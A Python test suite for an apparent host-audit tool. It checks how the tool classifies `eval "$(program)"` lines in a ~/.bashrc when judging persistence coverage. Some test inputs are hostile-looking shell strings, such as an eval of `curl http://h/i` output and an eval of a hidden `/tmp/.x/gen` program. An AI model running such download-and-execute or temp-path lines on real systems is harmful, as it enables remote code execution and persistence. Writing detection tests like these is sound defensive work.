"""`eval "$(prog …)"` in a start-up file: a trust assumption, not an incomplete inspection.

A stock Ubuntu `~/.bashrc` evaluates the output of `dircolors` and `lesspipe`;
until 0.2.0 that made `persistence` PARTIAL on every desktop and the verdict
INCONCLUSIVE. When the only unresolved sites are evals of package-attested,
non-relay programs, the file now carries the scope limit
EVAL_OF_ATTESTED_PROGRAM_OUTPUT instead. Everything else stays PARSE_UNSUPPORTED.
"""
from __future__ import annotations

import os
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

from falsicore import detectors
from falsicore.collectors import Audit, Gaps
from falsicore.shell_syntax import analyze

UID = 24680


class AnalyserReportsEvaluatedPrograms(unittest.TestCase):
    def test_literal_program_heads_are_reported_with_the_site_count(self):
        result = analyze('eval "$(dircolors -b ~/.dircolors)"\n[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"\n')
        self.assertEqual(result["limitations"], ["EXPANSION_NOT_RESOLVED"])
        self.assertEqual(sorted(result["evaluated_programs"]), ["dircolors", "lesspipe"])
        self.assertEqual(result["unresolved_expansions"], 2)

    def test_download_and_variable_evals_report_no_program(self):
        self.assertEqual(analyze('eval "$(curl http://h/i)"')["evaluated_programs"], [])
        result = analyze('x=$(dircolors); eval "$x"')
        self.assertEqual((result["evaluated_programs"], result["unresolved_expansions"]), ([], 1))
        mixed = analyze('eval "$(dircolors -b)"\n$CMD --x\n')
        self.assertEqual((mixed["evaluated_programs"], mixed["unresolved_expansions"]), (["dircolors"], 2))

    def test_eval_of_a_temp_program_is_still_a_pattern(self):
        result = analyze('eval "$(/tmp/.x/gen)"')
        self.assertIn("TEMP_PATH_IN_EXECUTION", result["patterns"])
        self.assertEqual(result["evaluated_programs"], ["/tmp/.x/gen"])


class AttestedProgramResolution(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name) / "root"
        (self.root / "home/fixture").mkdir(parents=True)
        (self.root / "usr/bin").mkdir(parents=True)
        (self.root / "usr/local/bin").mkdir(parents=True)
        for name in ("dircolors", "lesspipe", "cat", "starship"):
            (self.root / "usr/bin" / name).write_text("#!/bin/sh\n")
        (self.root / "usr/local/bin/zoxide").write_text("#!/bin/sh\n")
        pw = SimpleNamespace(pw_uid=UID, pw_dir=str(self.root / "home/fixture"), pw_name="fixture")
        with patch("falsicore.collectors.pwd.getpwnam", return_value=pw), \
             patch("falsicore.collectors.os.geteuid", return_value=UID), \
             patch("falsicore.collectors.os.getuid", return_value=UID):
            self.audit = Audit("user", target_user="fixture", root=self.root)
        self.attested = {self.root / "usr/bin/dircolors", self.root / "usr/bin/lesspipe", self.root / "usr/bin/cat"}
        self.audit.package_attested = lambda path, content: path in self.attested  # type: ignore[method-assign]
        self.audit.command = lambda *a, **k: {"status": "FAILED", "stdout": "", "stderr": "no crontab for fixture",
                                             "exit": 1, "elapsed_ms": 0, "truncated": False, "error": ""}

    def test_resolution_rules(self):
        self.assertEqual(self.audit._attested_program("dircolors"), self.root / "usr/bin/dircolors")
        self.assertEqual(self.audit._attested_program("/usr/bin/lesspipe"), self.root / "usr/bin/lesspipe")
        self.assertIsNone(self.audit._attested_program("cat"), "a relay program never qualifies, attested or not")
        self.assertIsNone(self.audit._attested_program("starship"), "present but not attested")
        self.assertIsNone(self.audit._attested_program("zoxide"), "/usr/local is not a packaged location")
        self.assertIsNone(self.audit._attested_program("missing"))
        self.assertIsNone(self.audit._attested_program("/tmp/.x"))
        self.assertIsNone(self.audit._attested_program(""))

    def decide(self, text: str) -> Gaps:
        gaps = Gaps()
        self.audit._shell_limit(analyze(text), self.root / "home/fixture/.bashrc", None, gaps)
        return gaps

    def test_decision_table(self):
        stock = self.decide('eval "$(dircolors -b ~/.dircolors)"\n[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"\n')
        self.assertEqual((dict(stock.incomplete), dict(stock.limits)), ({}, {"EVAL_OF_ATTESTED_PROGRAM_OUTPUT": 1}))
        for text in ('eval "$(starship init bash)"',                 # not attested
                     'eval "$(cat ~/.hook)"',                        # relay program: output is its input
                     'eval "$(dircolors -b)"\n$CMD\n',               # another unresolved site remains
                     'x=$(dircolors); eval "$x"',                    # dataflow through a variable
                     'eval "$(dircolors -b)"\ncat <<EOF\n'):        # a second kind of limitation
            gaps = self.decide(text)
            self.assertEqual(dict(gaps.incomplete), {"PARSE_UNSUPPORTED": 1}, text)
            self.assertEqual(dict(gaps.limits), {}, text)
        self.assertEqual((dict(self.decide("echo ok\n").incomplete), dict(self.decide("echo ok\n").limits)), ({}, {}))

    def test_stock_startup_file_leaves_persistence_complete_and_the_verdict_reachable(self):
        home = self.root / "home/fixture"
        (home / ".bashrc").write_text("case $- in\n  *i*) ;;\n  *) return;;\nesac\n"
                                      'eval "$(dircolors -b ~/.dircolors)"\n'
                                      '[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"\n')
        self.audit.persistence()
        row = next(c for c in self.audit.coverage if c["check"] == "persistence")
        self.assertEqual(row["status"], "COMPLETED", row)
        self.assertEqual(row["scope_limits"].get("EVAL_OF_ATTESTED_PROGRAM_OUTPUT"), 1)
        self.assertEqual(self.audit.stats["evaluated_attested_programs"][0]["programs"], ["dircolors", "lesspipe"])
        self.assertEqual(self.audit.findings, [])
        coverage = [{"check": c, "status": "COMPLETED", "scope_limits": {}} for c in
                    ("processes", "network", "browsers", "auth", "packages", "crossview")] + [row]
        self.assertEqual(detectors.interpret_verdict([], coverage), "NO_COMPROMISE_INDICATORS_OBSERVED")

    def test_unattested_eval_keeps_the_file_partial(self):
        (self.root / "home/fixture/.bashrc").write_text('eval "$(starship init bash)"\n')
        self.audit.persistence()
        row = next(c for c in self.audit.coverage if c["check"] == "persistence")
        self.assertEqual(row["status"], "PARTIAL")
        self.assertEqual(row["reason_codes"].get("PARSE_UNSUPPORTED"), 1)
        self.assertNotIn("evaluated_attested_programs", self.audit.stats)

    def test_fixture_files_are_not_attested_without_root_ownership(self):
        # Only a root-owned, package-recorded file attests; this unprivileged fixture never does.
        real = Audit.package_attested
        self.assertFalse(real(self.audit, self.root / "usr/bin/dircolors", b"#!/bin/sh\n"))
        self.assertNotEqual(os.geteuid(), 0)


if __name__ == "__main__":
    unittest.main()
